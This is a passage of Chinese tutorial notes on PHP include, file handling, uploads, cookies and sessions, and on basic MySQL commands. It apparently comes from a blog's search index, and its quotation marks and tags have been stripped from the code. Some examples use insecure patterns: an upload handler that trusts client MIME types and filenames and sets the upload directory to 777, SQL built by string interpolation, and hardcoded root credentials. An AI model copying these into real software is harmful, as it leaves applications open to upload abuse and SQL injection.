文件中的 post_max_size 进行更改） 变量不显示在 URL 中，所以无法把页面加入书签 http://www.runoob.com/welcome.php $_REQUEST 变量 预定义的 $_REQUEST 变量包含了 GET、_GET、G​ET、_POST 和 $_COOKIE 的内容。 $_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据 PHP 高级教程 PHP 包含文件 用于将一个文件的内容插入到另一个文件中 PHP include 和 require 语句 include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码 include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的： require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。 include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。 因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。 include filename;或者require filename; 实例 1 假设有一个标准的页头文件，名为 “header.php”。如需在页面中引用这个页头文件，请使用 include/require htmlheadmeta charset=utf-8title菜鸟教程(runoob.com)/title/headbody?php include header.php; ?h1欢迎来到我的主页!/h1p一些文本。/p/body/html 2 假设我们有一个在所有页面中使用的标准菜单文件。 “menu.php”: echo a href=/主页/aa href=/htmlHTML 教程/aa href=/phpPHP 教程/a; 网站中的所有页面均应引用该菜单文件。以下是具体的做法： htmlheadmeta charset=utf-8title菜鸟教程(runoob.com)/title/headbodydiv class=leftmenu?php include menu.php; ?/divh1欢迎来到我的主页!/h1p一些文本。/p/body/html 3 假设我们有一个定义变量的包含文件（“vars.php”）： ?php$color=red;$car=BMW;? 这些变量可用在调用文件中： htmlheadmeta charset=utf-8title菜鸟教程(runoob.com)/title/headbodyh1欢迎来到我的主页!/h1?php include vars.php;echo I have a $color $car; // I have a red BMW?/body/html PHP 文件处理 打开文件 fopen() 函数用于在 PHP 中打开文件 ?php$file=fopen(welcome.txt,r);? 此函数的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件 模式 描述 r 只读。在文件的开头开始。 r+ 读/写。在文件的开头开始。 w 只写。打开并清空文件的内容；如果文件不存在，则创建新文件。 w+ 读/写。打开并清空文件的内容；如果文件不存在，则创建新文件。 a 追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。 a+ 读/追加。通过向文件末尾写内容，来保持文件内容。 x 只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。 x+ 读/写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。 如果 fopen() 函数无法打开指定文件，则返回 0 (false)，可通过下例生成一段消息 ?php$file=fopen(welcome.txt,r) or exit(Unable to open file!);? 关闭文件 fclose() 函数用于关闭打开的文件 ?php$file = fopen(test.txt,r);//执行一些代码fclose($file);? 检测文件末尾（EOF） feof() 函数检测是否已到达文件末尾（EOF） if (feof($file)) echo 文件结尾; 在 w 、a 和 x 模式下，无法读取打开的文件 逐行读取文件 fgets() 函数用于从文件中逐行读取文件，在调用该函数之后，文件指针会移动到下一行 ?php$file = fopen(welcome.txt, r) or exit(无法打开文件!);// 读取文件每一行，直到文件结尾while(!feof($file)) echo fgets($file). br;fclose($file);? 逐字符读取文件 fgetc() 函数用于从文件中逐字符地读取文件，在调用该函数之后，文件指针会移动到下一个字符 ?php$file=fopen(welcome.txt,r) or exit(无法打开文件!);while (!feof($file)) echo fgetc($file);fclose($file);? PHP 文件上传 创建一个文件上传表单 htmlheadmeta charset=utf-8title菜鸟教程(runoob.com)/title/headbodyform action=upload_file.php method=post enctype=multipart/form-data label for=file文件名：/label input type=file name=file id=filebr input type=submit name=submit value=提交/form/body/html [!IMPORTANT] enctype 在 HTML 表单中，enctype 属性用于指定表单数据在发送到服务器时的编码类型。这个属性主要在使用 POST 方法时生效，决定了表单中数据如何被格式化。下面是常用的enctype值： 值 描述 application/x-www-form-urlencoded 默认值。表单数据会被编码为键值对（键和值通过 = 连接，不同键值对通过 连接）以 URL 编码的形式发送到服务器。适用于普通表单（比如文本输入） multipart/form-data 用于上传文件时。数据会以分段形式进行编码，每段包含一个表单控件的数据。必须在表单中使用 method=post 和 enctype=multipart/form-data 才能上传文件 text/plain 表单数据以纯文本形式进行编码（键值对以 = 连接，不同键值对通过换行符分隔）不会对特殊字符进行编码 input 标签的 type=“file” 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。 创建上传脚本 ?phpif ($_FILES[file][error] 0) echo 错误： . $_FILES[file][error] . br;else echo 上传文件名: . $_FILES[file][name] . br; echo 文件类型: . $_FILES[file][type] . br; echo 文件大小: . ($_FILES[file][size] / 1024) . kBbr; echo 文件临时存储的位置: . $_FILES[file][tmp_name];? 通过使用 PHP 的全局数组 $_FILES，可以从客户计算机向远程服务器上传文件 [!IMPORTANT] $_FILES 第一个参数是表单的 input name，第二个下标可以是 “name”、“type”、“size”、“tmp_name” 或 “error” 字段 说明 示例 $_FILES['file']['name'] 上传文件的原始名称（包括扩展名） example.jpg $_FILES['file']['type'] 上传文件的 MIME 类型（例如 image/jpeg，text/plain） image/jpeg $_FILES['file']['size'] 上传文件的大小，以字节为单位 102400 (100 KB) $_FILES['file']['tmp_name'] 文件上传后存储在服务器上的临时文件名 /tmp/phpY9k1b9 $_FILES['file']['error'] 上传过程中发生的错误代码 UPLOAD_ERR_OK (0) 常见的error错误代码 错误代码 说明 错误数字 UPLOAD_ERR_OK 文件上传成功 0 UPLOAD_ERR_INI_SIZE 上传的文件超过了 PHP 配置文件 upload_max_filesize 的限制 1 UPLOAD_ERR_FORM_SIZE 上传的文件超过了 HTML 表单设置的 MAX_FILE_SIZE 的限制 2 UPLOAD_ERR_PARTIAL 文件部分上传（可能由于网络中断等原因） 3 UPLOAD_ERR_NO_FILE 没有文件被上传 4 UPLOAD_ERR_NO_TMP_DIR PHP 缺少临时文件夹 6 UPLOAD_ERR_CANT_WRITE PHP 无法写入文件到磁盘 7 UPLOAD_ERR_EXTENSION 上传被 PHP 扩展程序阻止 8 上传限制 限制文件上传的格式（如.gif、.png）及上传文件的大小 保存被上传的文件 ?php// 允许上传的图片后缀$allowedExts = array(gif, jpeg, jpg, png);$temp = explode(., $_FILES[file][name]);echo $_FILES[file][size];$extension = end($temp); // 获取文件后缀名if ((($_FILES[file][type] == image/gif)|| ($_FILES[file][type] == image/jpeg)|| ($_FILES[file][type] == image/jpg)|| ($_FILES[file][type] == image/pjpeg)|| ($_FILES[file][type] == image/x-png)|| ($_FILES[file][type] == image/png)) ($_FILES[file][size] 204800) // 小于 200 kb in_array($extension, $allowedExts)) if ($_FILES[file][error] 0) echo 错误：: . $_FILES[file][error] . br; else echo 上传文件名: . $_FILES[file][name] . br; echo 文件类型: . $_FILES[file][type] . br; echo 文件大小: . ($_FILES[file][size] / 1024) . kBbr; echo 文件临时存储的位置: . $_FILES[file][tmp_name] . br; // 判断当前目录下的 upload 目录是否存在该文件 // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777 if (file_exists(upload/ . $_FILES[file][name])) echo $_FILES[file][name] . 文件已经存在。 ; else // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下 move_uploaded_file($_FILES[file][tmp_name], upload/ . $_FILES[file][name]); echo 文件存储在: . upload/ . $_FILES[file][name]; else echo 非法的文件格式;? [!IMPORTANT] in_array($extension, $allowedExts) 用于检查文件扩展名是否在允许的扩展名列表中 $extension，即文件扩展名，$allowedExts，即允许的扩展名列表 PHP Cookie cookie 常用于识别用户 cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie 创建Cookie setcookie() 函数用于设置 cookie，setcookie() 函数必须位于 html 标签之前 setcookie(name, value, expire, path, domain); 实例 创建名为 “user” 的 cookie，并为它赋值 “runoob”，规定了此 cookie 在一小时后过期 ?phpsetcookie(user, runoob, time()+3600);?html..... [!CAUTION] 在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码（为防止 URL 编码，请使用 setrawcookie() 取而代之） [!TIP] 可以通过另一种方式设置 cookie 的过期时间（比使用秒表示的方法简单） ?php$expire=time()+60*60*24*30;setcookie(user, runoob, $expire);? 在上面的实例中，过期时间被设置为一个月（60 秒 * 60 分 * 24 小时 * 30 天） 取回Cookie的值 PHP 的 $_COOKIE 变量用于取回 cookie 的值 在下面的实例中，我们取回了名为 “user” 的 cookie 的值，并把它显示在了页面上： ?php// 输出 cookie 值echo $_COOKIE[user];// 查看所有 cookieprint_r($_COOKIE);? 在下面的实例中，我们使用 isset() 函数来确认是否已设置了 cookie： ?phpif (isset($_COOKIE[user])) echo 欢迎 . $_COOKIE[user] . !br;else echo 普通访客!br;? 删除Cookie 当删除 cookie 时，应当使过期日期变更为过去的时间点 ?php// 设置 cookie 过期时间为过去 1 小时setcookie(user, , time()-3600);? 浏览器不支持Cookie 一种解决方式是通过表单传递数据 PHP Session PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的 与 Cookie 不同，Session 的数据存储在服务器上 Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。 开始PHP Session 把用户信息存储到 PHP session 中之前，首先必须启动会话。 注：session_start() 函数必须位于 html 标签之前： ?php session_start(); ? htmlbody /body/html 上面的代码会向服务器注册用户的会话，以便可以开始保存用户信息，同时会为用户会话分配一个 UID 存储和读取 Session 数据 使用 PHP $_SESSION 变量 ?phpsession_start();// 读取 Session 数据if (isset($_SESSION[username])) echo 用户名: . $_SESSION[username]; // 输出: 用户名: Alice else echo 用户名未设置。;? 销毁Session 可以使用 unset() 或 session_destroy() 函数删除某些 session 数据 unset() 删除 $_SESSION 里的指定数据 ?phpsession_start();if(isset($_SESSION[views])) unset($_SESSION[views]);? session_unset() 清空所有会话数据但保留会话本身（即不会删除 Session ID 或终止会话） session_destroy() 终止会话并删除服务器端的会话数据（如存储在 $_SESSION 中的所有数据）然而，它不会立即清空 $_SESSION 数组中的数据，也不会删除客户端的 Session ID Cookie ?phpsession_destroy();? [!TIP] 如果 session_destroy() 后还需要删除客户端的会话 Cookie setcookie(session_name(), , time() - 3600); // 删除客户端 Cookie ?phpsession_start(); // 开启会话// 清空所有 Session 数据session_unset();// 销毁会话session_destroy();// 删除客户端的 Session ID Cookieif (ini_get(session.use_cookies)) $params = session_get_cookie_params(); setcookie(session_name(), , time() - 3600, $params[path], $params[domain], $params[secure], $params[httponly] );echo 会话已销毁，客户端的 Session Cookie 已删除。;? PHP 数据库","tags":["PHP","OOP"],"categories":["PHP","编程"]},{"title":"MySQL","path":"/2025/07/09/MySQL/","content":"MySQL 一个关系型数据库管理系统（RDBMS） MySQL 注释 单行注释（-- 和 #） 多行注释（/* */） MySQL连接 使用 MySQL 二进制方式连接 win+R - cmd 通过D:切换到D盘（我的mysql安装在D盘） mysql -u root -p 按照提示输入密码root（默认），并按下 Enter 键 在登录成功后会出现mysql命令提示窗口，你可以在上面执行任何 SQL 语句 Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 2854760 to server version: 5.0.9Type help; or \\h for help. Type \\c to clear the buffer. 以上为登录成功输出结果 列出所有可用的数据库： SHOW DATABASES; 选择要使用的数据库： USE your_database; 列出所选数据库中的所有表： SHOW TABLES; 退出mysql命令提示窗口：EXIT 或 QUIT 使用 PHP 脚本连接 mysqli_connect() 函数来连接数据库 mysqli_connect(host, username, password, dbname,port, socket); 参数 描述 host 可选。规定主机名或 IP 地址。 username 可选。规定 MySQL 用户名。 password 可选。规定 MySQL 密码。 dbname 可选。规定默认使用的数据库。 port 可选。规定尝试连接到 MySQL 服务器的端口号。 socket 可选。规定 socket 或要使用的已命名 pipe。 mysqli_close() 函数来断开与 MySQL 数据库的链接 bool mysqli_close ( mysqli $link ) ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = root; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(Could not connect: . mysqli_error());echo 数据库连接成功！;mysqli_close($conn);? MySQL 创建数据库 使用 create 命令 CREATE DATABASE 数据库名; CREATE DATABASE 数据库名 CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci; [!CAUTION] 上述例子指定该数据库使用的字符集为 utf8mb4，支持完整的 UTF-8 编码（包括表情符号和其他特殊字符）并设置排序规则为 utf8mb4_general_ci，表示不区分大小写 为了避免数据库已经存在，执行 CREATE DATABASE 将导致错误： CREATE DATABASE IF NOT EXISTS 数据库名; 使用 mysqladmin mysqladmin -u root -p create 数据库名 如果要在创建数据库时指定字符集和排序规则，可以使用 -default-character-set和 -default-collation参数： mysqladmin -u root -p create 数据库名 \\ --default-character-set=utf8mb4 \\ --default-collation=utf8mb4_general_ci 如果希望使用 mysqladmin 连接到 MySQL 服务器执行其他管理任务，例如查看服务器状态、重启服务器等，可以使用以下形式的命令： mysqladmin -u your_username -p your_command//your_command为希望执行的具体管理命令 例如，要查看 MySQL 服务器的状态： mysqladmin -u root -p status 使用 PHP脚本 PHP 使用 mysqli_query 函数来创建或者删除 MySQL 数据库 mysqli_query(connection,query,resultmode); 参数 描述 connection 必需。规定要使用的 MySQL 连接。 query 必需，规定查询字符串。 resultmode 可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认） ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = root; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接错误: . mysqli_error($conn));echo 连接成功br /;$sql = CREATE DATABASE RUNOOB;$retval = mysqli_query($conn,$sql );if(! $retval ) die(创建数据库失败: . mysqli_error($conn));echo 数据库 RUNOOB 创建成功 ;mysqli_close($conn);? MySQL 删除数据库 使用drop 命令 DROP DATABASE 数据库名; -- 直接删除数据库，不检查是否存在或DROP DATABASE IF EXISTS 数据库名; 使用 mysqladmin mysqladmin -u root -p drop 数据库名 使用 PHP 脚本 PHP使用 mysqli_query 函数来创建或者删除 MySQL 数据库 ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = root; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));echo 连接成功br /;$sql = DROP DATABASE RUNOOB;$retval = mysqli_query( $conn, $sql );if(! $retval ) die(删除数据库失败: . mysqli_error($conn));echo 数据库 RUNOOB 删除成功 ;mysqli_close($conn);? MySQL 选择数据库 从命令提示窗口中 在 MySQL 中 USE 数据库名; 在命令行中 mysql -u root -p -D 数据库名 使用 PHP 脚本 mysqli_select_db(connection,dbname); 参数 描述 connection 必需。规定要使用的 MySQL 连接。 dbname 必需，规定要使用的默认数据库。 ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = 123456; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));echo 连接成功;mysqli_select_db($conn, RUNOOB );mysqli_close($conn);? MySQL 数据类型 详见 数值类型 整数类型 TINYINT ：存储年龄、数量 INT 或 BIGINT：主键或用户ID 小数类型 DECIMAL：需要精确存储的小数，例如货币金额 FLOAT或DOUBLE：需要近似存储的小数，例如科学计算结果 日期和时间类型 DATE：仅存储日期 DATETIME：存储日期和时间，例如用户注册时间 TIMESTAMP：带有时区的日期时间（自动更新），例如日志记录时间 TIME：存储时间部分 字符串类型 CHAR：数据长度固定，例如存储固定长度的编码 VARCHAR：数据长度不固定，例如存储用户名、邮箱地址 TEXT或BLOB：需要存储大文本或二进制数据时，例如文章内容存储在 TEXT 中，图片存储在 BLOB 中 枚举与集合类型 ENUM 或 TINYINT ：有限的枚举数据（如状态值 active/inactive） 空间数据类型 MySQL 创建数据表 CREATE TABLE table_name ( column1 datatype, column2 datatype, ...); table_name 是要创建的表的名称。 column1, column2, … 是表中的列名。 datatype 是每个列的数据类型。 CREATE TABLE users ( id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50) NOT NULL, email VARCHAR(100) NOT NULL, birthdate DATE, is_active BOOLEAN DEFAULT TRUE); AUTO_INCREMENT 关键字用于创建一个自增长的列，数值会自动加 1 PRIMARY KEY 用于定义主键（是用来唯一标识数据库表中每一条记录的字段（或字段组合）） NOT NULL不允许为空 如果希望在创建表时指定数据引擎，字符集和排序规则等，可以使用 CHARACTER SET 和 COLLATE 子句 CREATE TABLE mytable ( id INT PRIMARY KEY, name VARCHAR(50)) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci; 以下例子中我们将在 RUNOOB 数据库中创建数据表 runoob_tbl： CREATE TABLE IF NOT EXISTS `runoob_tbl`( `runoob_id` INT UNSIGNED AUTO_INCREMENT, `runoob_title` VARCHAR(100) NOT NULL, `runoob_author` VARCHAR(40) NOT NULL, `submission_date` DATE, PRIMARY KEY ( `runoob_id` ))ENGINE=InnoDB DEFAULT CHARSET=utf8; ENGINE 设置存储引擎，CHARSET 设置编码 root@host# mysql -u root -pEnter password:****mysql USE RUNOOB;DATABASE changedmysql CREATE TABLE runoob_tbl( - runoob_id INT NOT NULL AUTO_INCREMENT, - runoob_title VARCHAR(100) NOT NULL, - runoob_author VARCHAR(40) NOT NULL, - submission_date DATE, - PRIMARY KEY ( runoob_id ) - )ENGINE=InnoDB DEFAULT CHARSET=utf8;Query OK, 0 ROWS affected (0.16 sec)mysql MySQL 命令终止符为分号 ; - 是换行符标识 使用 PHP 脚本创建数据表 使用 PHP 的 mysqli_query() 函数来创建已存在数据库的数据表 mysqli_query(connection,query,resultmode); 参数 描述 connection 必需。规定要使用的 MySQL 连接。 query 必需，规定查询字符串。 resultmode 可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认） ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = root; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));echo 连接成功br /;$sql = CREATE TABLE runoob_tbl( . runoob_id INT NOT NULL AUTO_INCREMENT, . runoob_title VARCHAR(100) NOT NULL, . runoob_author VARCHAR(40) NOT NULL, . submission_date DATE, . PRIMARY KEY ( runoob_id ))ENGINE=InnoDB DEFAULT CHARSET=utf8; ;mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(数据表创建失败: . mysqli_error($conn));echo 数据表创建成功 ;mysqli_close($conn);? 通过命令行查看表结构 show tables; desc runoob_tbl; MySQL 删除数据表 通过命令提示符删除数据表 DROP TABLE table_name; -- 直接删除表，不检查是否存在 DROP TABLE [IF EXISTS] table_name; -- 会检查是否存在，如果存在则删除 如果只是想删除表中的所有数据，但保留表的结构，可以使用 TRUNCATE TABLE 语句： TRUNCATE TABLE table_name; 使用 PHP 脚本删除数据表 mysqli_query(connection,query,resultmode); ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = 123456; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));echo 连接成功br /;$sql = DROP TABLE runoob_tbl;mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(数据表删除失败: . mysqli_error($conn));echo 数据表删除成功 ;mysqli_close($conn);? MySQL 插入数据 MySQL 表中使用 INSERT INTO语句来插入数据 INSERT INTO table_name (column1, column2, column3, ...)VALUES (value1, value2, value3, ...); table_name 是你要插入数据的表的名称。 column1, column2, column3, … 是表中的列名。 value1, value2, value3, … 是要插入的具体数值(如果数据是字符型，必须使用单引号 ’ 或者双引号 ) 如果要插入所有列的数据，可以省略列名： INSERT INTO usersVALUES (NULL,test, test@runoob.com, 1990-01-01, true); 这里，NULL 是用于自增长列的占位符，表示系统将为 id 列生成一个唯一的值 如果你要插入多行数据，可以在 VALUES 子句中指定多组数值： INSERT INTO users (username, email, birthdate, is_active)VALUES (test1, test1@runoob.com, 1985-07-10, true), (test2, test2@runoob.com, 1988-11-25, false), (test3, test3@runoob.com, 1993-05-03, true); 通过命令提示窗口插入数据 root@host# mysql -u root -p password;Enter password:*******mysql USE RUNOOB;DATABASE changedmysql INSERT INTO runoob_tbl - (runoob_title, runoob_author, submission_date) - VALUES - (学习 PHP, 菜鸟教程, NOW());Query OK, 1 ROWS affected, 1 warnings (0.01 sec)mysql INSERT INTO runoob_tbl - (runoob_title, runoob_author, submission_date) - VALUES - (学习 MySQL, 菜鸟教程, NOW());Query OK, 1 ROWS affected, 1 warnings (0.01 sec)mysql INSERT INTO runoob_tbl - (runoob_title, runoob_author, submission_date) - VALUES - (JAVA 教程, RUNOOB.COM, 2016-05-06);Query OK, 1 ROWS affected (0.00 sec)mysql 实例中 NOW() 是一个 MySQL 函数，该函数返回日期和时间 查看数据表数据： select * from runoob_tbl; 使用 PHP 脚本插入数据 mysqli_query(connection,query,resultmode); ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = root; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));echo 连接成功br /;// 设置编码，防止中文乱码mysqli_query($conn , set names utf8); $runoob_title = 学习 Python;$runoob_author = RUNOOB.COM;$submission_date = 2016-03-06; $sql = INSERT INTO runoob_tbl . (runoob_title,runoob_author, submission_date) . VALUES . ($runoob_title,$runoob_author,$submission_date); mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(无法插入数据: . mysqli_error($conn));echo 数据插入成功 ;mysqli_close($conn);? 对于含有中文的数据插入，需要添加 mysqli_query($conn , “set names utf8”); 语句 MySQL 查询数据 MySQL 数据库使用 SELECT 语句来查询数据 SELECT column1, column2, ...FROM table_name[WHERE condition][ORDER BY column_name [ASC | DESC]][LIMIT number]; column1, column2, … 是你想要选择的列的名称，如果使用 * 表示选择所有列。 table_name 是你要从中查询数据的表的名称。 WHERE condition 是一个可选的子句，用于指定过滤条件，只返回符合条件的行。 ORDER BY column_name [ASC | DESC] 是一个可选的子句，用于指定结果集的排序顺序，默认是升序（ASC）。 LIMIT number 是一个可选的子句，用于限制返回的行数 -- 选择所有列的所有行SELECT * FROM users;-- 选择特定列的所有行SELECT username, email FROM users;-- 添加 WHERE 子句，选择满足条件的行SELECT * FROM users WHERE is_active = TRUE;-- 添加 ORDER BY 子句，按照某列的升序排序SELECT * FROM users ORDER BY birthdate;-- 添加 ORDER BY 子句，按照某列的降序排序SELECT * FROM users ORDER BY birthdate DESC;-- 添加 LIMIT 子句，限制返回的行数SELECT * FROM users LIMIT 10; 通过命令提示符获取数据 select * from runoob_tbl; 使用 PHP 脚本来获取数据 使用 PHP 函数的 mysqli_query() 及 SQL SELECT 命令来获取数据。该函数用于执行 SQL 命令，然后通过 PHP 函数 mysqli_fetch_array() 来使用或输出所有查询的数据 ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = root; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));// 设置编码，防止中文乱码mysqli_query($conn , set names utf8); $sql = SELECT runoob_id, runoob_title, runoob_author, submission_date FROM runoob_tbl; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(无法读取数据: . mysqli_error($conn));echo h2菜鸟教程 mysqli_fetch_array 测试/h2;echo table border=1trtd教程 ID/tdtd标题/tdtd作者/tdtd提交日期/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_title] /td . td$row[runoob_author] /td . td$row[submission_date] /td . /tr;/*while($row = mysqli_fetch_array($retval, MYSQLI_NUM)) echo trtd $row[0]/td . td$row[1] /td . td$row[2] /td . td$row[3] /td . /tr;*/echo /table;// 释放内存mysqli_free_result($retval);mysqli_close($conn);? [!IMPORTANT] mysqli_fetch_array($result, $result_type); $result：必需，表示查询的结果集。通常是通过 mysqli_query() 执行查询后得到的。 $result_type：可选，指定返回的数组类型，可以是以下值： MYSQLI_ASSOC：返回关联数组，列名作为键。 MYSQLI_NUM：返回数字数组，列的索引作为键。 执行完 SELECT 语句后，通过 PHP 函数 mysqli_free_result() 来实现内存的释放 MySQL WHERE 子句 将 WHERE 子句添加到 SELECT 语句中可以有条件地从表中选取数据（过滤查询结果），只返回满足特定条件的行 SELECT column1, column2, ...FROM table_nameWHERE condition; column1, column2, … 是你要选择的列的名称，如果使用 * 表示选择所有列。 table_name 是你要从中查询数据的表的名称。 WHERE condition 是用于指定过滤条件的子句。 [!TIP] 查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。 你可以在 WHERE 子句中指定任何条件。 你可以使用 AND 或者 OR 指定一个或多个条件。 WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。 WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。 组合条件（AND、OR）: SELECT * FROM products WHERE category = Electronics AND price 100.00;SELECT * FROM orders WHERE order_date = 2023-01-01 OR total_amount 1000.00; 模糊匹配条件（LIKE）: SELECT * FROM customers WHERE first_name LIKE J%; IN 条件: SELECT * FROM countries WHERE country_code IN (US, CA, MX); NOT 条件: SELECT * FROM products WHERE NOT category = Clothing; BETWEEN 条件: SELECT * FROM orders WHERE order_date BETWEEN 2023-01-01 AND 2023-12-31; 从命令提示符中读取数据 SELECT * from runoob_tbl WHERE runoob_author=菜鸟教程; MySQL 的 WHERE 子句的字符串比较是不区分大小写的。 你可以使用 BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写的 SELECT * from runoob_tbl WHERE BINARY runoob_author=runoob.com; 使用 PHP 脚本读取数据 以下实例将从 runoob_tbl 表中返回使用 runoob_author 字段值为 RUNOOB.COM 的记录： ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = 123456; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));// 设置编码，防止中文乱码mysqli_query($conn , set names utf8); // 读取 runoob_author 为 RUNOOB.COM 的数据$sql = SELECT runoob_id, runoob_title, runoob_author, submission_date FROM runoob_tbl WHERE runoob_author=RUNOOB.COM; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(无法读取数据: . mysqli_error($conn));echo h2菜鸟教程 MySQL WHERE 子句测试h2;echo table border=1trtd教程 ID/tdtd标题/tdtd作者/tdtd提交日期/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_title] /td . td$row[runoob_author] /td . td$row[submission_date] /td . /tr;echo /table;// 释放内存mysqli_free_result($retval);mysqli_close($conn);? MySQL UPDATE 更新 使用 UPDATE 命令修改或更新 MySQL 中的数据 UPDATE table_nameSET column1 = value1, column2 = value2, ...WHERE condition; table_name 是你要更新数据的表的名称。 column1, column2, … 是你要更新的列的名称。 value1, value2, … 是新的值，用于替换旧的值。 WHERE condition 是一个可选的子句，用于指定更新的行。如果省略 WHERE 子句，将更新表中的所有行。 通过命令提示符更新数据 UPDATE runoob_tbl SET runoob_title=学习 C++ WHERE runoob_id=3; 使用PHP脚本更新数据 不使用 WHERE 子句将会对数据表的全部数据进行更新 以下实例将更新 runoob_id 为 3 的 runoob_title 字段的数据 ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = 123456; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));// 设置编码，防止中文乱码mysqli_query($conn , set names utf8); $sql = UPDATE runoob_tbl SET runoob_title=学习 Python WHERE runoob_id=3; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(无法更新数据: . mysqli_error($conn));echo 数据更新成功！;mysqli_close($conn);? MySQL DELETE 语句 用 DELETE FROM 命令来删除 MySQL 数据表中的记录 DELETE FROM table_nameWHERE condition; 从命令行中删除数据 DELETE FROM runoob_tbl WHERE runoob_id=3; 使用 PHP 脚本删除数据 以下实例将删除 runoob_tbl 表中 runoob_id 为3 的记录 ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = root; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));// 设置编码，防止中文乱码mysqli_query($conn , set names utf8); $sql = DELETE FROM runoob_tbl WHERE runoob_id=3; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(无法删除数据: . mysqli_error($conn));echo 数据删除成功！;mysqli_close($conn);? MySQL LIKE 子句 LIKE 子句是在 MySQL 中用于在 WHERE 子句中进行模糊匹配的关键字。它通常与通配符一起使用，用于搜索符合某种模式的字符串 LIKE 子句中使用百分号 **%**字符来表示任意字符，如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的 % 通配符表示零个或多个字符。例如，‘a%’ 匹配以字母 ‘a’ 开头的任何字符串 _ 通配符表示一个字符。例如，‘_r%’ 匹配第二个字母为 ‘r’ 的任何字符串 SELECT column1, column2, ...FROM table_nameWHERE column_name LIKE pattern; column1, column2, … 是你要选择的列的名称，如果使用 * 表示选择所有列。 table_name 是你要从中查询数据的表的名称。 column_name 是你要应用 LIKE 子句的列的名称。 pattern 